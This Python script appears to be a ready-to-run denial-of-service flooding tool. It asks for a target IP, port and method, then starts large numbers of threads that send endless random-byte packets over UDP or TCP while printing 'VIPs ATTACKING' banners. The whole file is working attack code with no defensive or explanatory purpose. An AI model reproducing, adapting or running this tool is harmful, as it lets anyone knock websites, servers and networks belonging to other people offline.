import random
import socket
import threading
import os
import sys
import time
from time import sleep

ip = str(input("[•] Ip > "))
port = int(input("[•] Port > "))
choice = str(input("[•] Methods (udp/tcp) > "))
times = int(input("[•] Connections (default 450) > "))
threads = int(input("[+] Threads (default 28000) > "))
os.system("clear")

def ddos():
	data = random._urandom(666)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("\u001b[31m[!] VIPs ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			print("\u001b[31m[×] VIPs ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def ddos2():
	data = random._urandom(521)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("\u001b[31m[!] VIPs ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] VIPs ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def ddos3():
	data = random._urandom(1025)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("\u001b[31m[!] VIPs ATTACKING TO\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] VIPs ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


for y in range(threads):
	if choice == 'udp':
		th = threading.Thread(target = ddos)
		th.start()
		th = threading.Thread(target = ddos2)
		th.start()
	elif choice == 'tcp':
		th = threading.Thread(target = ddos3)
		th.start()
